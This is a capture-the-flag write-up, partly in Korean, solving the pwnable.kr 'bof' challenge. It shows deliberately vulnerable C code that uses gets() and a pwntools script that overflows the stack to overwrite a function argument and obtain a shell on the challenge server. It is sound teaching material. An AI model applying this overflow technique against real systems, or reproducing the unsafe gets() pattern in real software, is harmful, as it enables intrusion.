# [pwnable.kr] bof

> Nana told me that buffer overflow is one of the most common software vulnerability. 
> Is that true?
>
> Download : http://pwnable.kr/bin/bof
> Download : http://pwnable.kr/bin/bof.c
>
> Running at : nc pwnable.kr 9000

## Analysis

```c
/* bof.c */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

`func()`에서 `overflowme`에 입력을 받을 때 `gets()`를 사용하여 Stack buffer overflow가 발생할 수 있다.

## Exploit

Stack BOF를 이용하여 `func()`의 인자인 `key`의 값을 `0xcafebabe`로 덮어쓰면 플래그를 획득할 수 있다.

![image](https://github.com/h0meb0dy/h0meb0dy/assets/104156058/13e8a6cd-49b3-4744-90f9-7703080fb06f)

![image](https://github.com/h0meb0dy/h0meb0dy/assets/104156058/a2bad5fe-844a-4842-ad4c-f42abad5c782)

`overflowme`와 `key`의 주소는 `0x34`만큼 차이가 나기 때문에, `0x34`바이트의 dummy 뒤에 `0xcafebabe`를 이어붙이면 `key`를 덮어쓸 수 있다.

```python
# ex.py

from pwn import *

r = remote("pwnable.kr", 9000)

payload = b"A" * 0x34
payload += p32(0xCAFEBABE)

r.sendline(payload)

r.interactive()
```

![image](https://github.com/h0meb0dy/h0meb0dy/assets/104156058/c93cd74b-ba38-4d62-bfda-52cb564f8bb5)
